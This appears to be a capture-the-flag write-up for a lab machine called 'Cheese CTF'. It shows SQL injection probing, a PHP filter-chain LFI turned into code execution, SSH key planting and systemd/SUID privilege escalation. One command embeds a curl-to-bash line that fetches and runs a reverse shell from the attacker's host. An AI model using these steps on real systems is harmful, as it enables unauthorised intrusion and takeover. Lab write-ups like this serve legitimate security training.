{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("Running an Nmap scan yields a lot, and I mean a lot of open ports. Almost all of them are not meaningful and are there to throw us off.")}}

{{text("Ports that we should focus on are:")}}

{{list(['22 (SSH)', '80 (HTTP)'])}}

{{text("Upon visiting port 80, we are presented with a cheese shop page.")}}

{{image("../../static/writeups/cheesectf/images/000002.jpg")}}

{{header("Admin page", "admin-page")}}

{{text("There is also a login page.")}}

{{image("../../static/writeups/cheesectf/images/000003.jpg")}}

{{text("We should test if <code class='bg-gray-300 rounded-md px-1'>SQL Injection</code> will work on this form.")}}

{{text("We catch the request using Burp Suite and then try to use it in SQLMap.")}}

{{image("../../static/writeups/cheesectf/images/000004.jpg")}}

{{console("sqlmap -r request.txt", "...
got a 302 redirect to 'http://10.10.229.61/secret-script.php?file=supersecretadminpanel.html'. Do you want to follow? [Y/n]
...")}}

{{text("We can see that SQLMap got redirected to <code class='bg-gray-300 rounded-md px-1'>?file=supersecretadminpanel.html</code>. We can try to go to this URL.")}}

{{image("../../static/writeups/cheesectf/images/000013.jpg")}}

{{text("We access the admin panel for the website.")}}

{{image("../../static/writeups/cheesectf/images/000005.jpg")}}

{{header("Shell as www-data", "shell-as-www-data")}}

{{text("There is an interesting <code class='bg-gray-300 rounded-md px-1'>?file</code> parameter together with <code class='bg-gray-300 rounded-md px-1'>php://filter</code>.")}}

{{image("../../static/writeups/cheesectf/images/000006.jpg")}}

{{text("While trying to read about PHP filters and how to exploit them, I stumbled upon this:")}}

{{link("https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi--rfi-using-wrappers", "https://github.githubassets.com/favicons/favicon.svg", "LFI / RFI using php://filter wrappers")}}

{{text("We are instructed to use a <code class='bg-gray-300 rounded-md px-1'>php filter chain generator</code> to generate a PHP chain, which we could use to achieve RCE.")}}

{{link("https://github.com/synacktiv/php_filter_chain_generator", "https://github.githubassets.com/favicons/favicon.svg", "PHP filter chain generator")}}

{{text("We get the Python file and begin constructing our reverse shell.")}}

{{text("We get a reverse shell from <code class='bg-gray-300 rounded-md px-1'>revshells.com</code> and save it in a file.")}}

{{image("../../static/writeups/cheesectf/images/000007.jpg")}}

{{text("We then generate a PHP filter chain that will download our reverse shell and execute it.")}}

{{console("python3 php_filter_chain_generator.py --chain '<?= curl -s -L 10.9.4.147/payload|bash ?>'", "
[+] The following gadget chain will generate the following code : <?= curl -s -L 10.9.4.147/payload|bash ?>
(base64 value: PD89IGBjdXJsIC1zIC1MIDEwLjkuNC4xNDcvcGF5bG9hZHxiYXNoYCA/Pg) php://filter/...")}}

{{text("We set up a netcat listener on the correct port and paste our generated chain into the URL.")}}

{{text("If we did everything correctly, we should now have a reverse shell.")}}

{{image("../../static/writeups/cheesectf/images/000008.jpg")}}

{{header("Shell as comte", "shell-as-comte")}}

{{text("While browsing through the files, we go into <code class='bg-gray-300 rounded-md px-1'>/home/comte/.ssh</code> and discover that the <code class='bg-gray-300 rounded-md px-1'>authorized_keys</code> file is writable by us.")}}

{{image("../../static/writeups/cheesectf/images/000009.jpg")}}

{{text("We just need to add our SSH key into this file, and we will be able to log in as the <code class='bg-gray-300 rounded-md px-1'>comte</code> user.")}}

{{text("Back on our machine, we generate a set of SSH keys.")}}

{{console("ssh-keygen -t rsa", "Generating public/private rsa key pair.
Enter file in which to save the key (/home/user/.ssh/id_rsa): /home/user/php_filter_chain_generator/id_rsa
Enter passphrase (empty for no passphrase):
...")}}

{{text("We copy our <code class='bg-gray-300 rounded-md px-1'>id_rsa.pub</code> key and paste it into the <code class='bg-gray-300 rounded-md px-1'>authorized_keys</code> file.")}}

{{image("../../static/writeups/cheesectf/images/000010.jpg")}}

{{text("We can now log in as user <code class='bg-gray-300 rounded-md px-1'>comte</code> by providing our <code class='bg-gray-300 rounded-md px-1'>id_rsa</code> file.")}}

{{console("ssh comte@10.10.41.67 -i id_rsa", "The authenticity of host '10.10.41.67 (10.10.41.67)' can't be established.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.41.67' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS GNU/Linux 5.4.0-174-generic x86_64 ...")}}


{{text("We are able to read the <code class='bg-gray-300 rounded-md px-1'>user.txt</code> flag now.")}}

{{header("Shell as root", "shell-as-root")}}

{{text("Running <code class='bg-gray-300 rounded-md px-1'>sudo -l</code> reveals a lot of useful information.")}}

{{console("sudo -l", "User comte may run the following commands on cheesectf: 
(ALL) NOPASSWD: /bin/systemctl daemon-reload 
(ALL) NOPASSWD: /bin/systemctl restart exploit.timer 
(ALL) NOPASSWD: /bin/systemctl start exploit.timer 
(ALL) NOPASSWD: /bin/systemctl enable exploit.timer")}}

{{text("If we read the <code class='bg-gray-300 rounded-md px-1'>/etc/systemd/system/exploit.service</code> service, we see that it copies <code class='bg-gray-300 rounded-md px-1'>xxd</code> to <code class='bg-gray-300 rounded-md px-1'>/opt</code> and adds a <code class='bg-gray-300 rounded-md px-1'>SUID bit</code> to it.")}}

{{text("If we try to run <code class='bg-gray-300 rounded-md px-1'>exploit.timer</code>, it fails.")}}

{{text("This is because the <code class='bg-gray-300 rounded-md px-1'>OnBootSec</code> value is not present in the file.")}}

{{text("We have to modify it for it to run.")}}

{{image("../../static/writeups/cheesectf/images/000011.jpg")}}

{{text("Now, after running the service, a <code class='bg-gray-300 rounded-md px-1'>SUID bit</code> should have been added to the <code class='bg-gray-300 rounded-md px-1'>xxd</code> binary.")}}

{{text("We can use the method from <code class='bg-gray-300 rounded-md px-1'>GTFObins</code> to read the flag.")}}

{{link("https://gtfobins.github.io/gtfobins/xxd/#file-read", "https://gtfobins.github.io/assets/logo.png", "xxd | GTFObins")}}

{{image("../../static/writeups/cheesectf/images/000012.jpg")}}

{{script()}}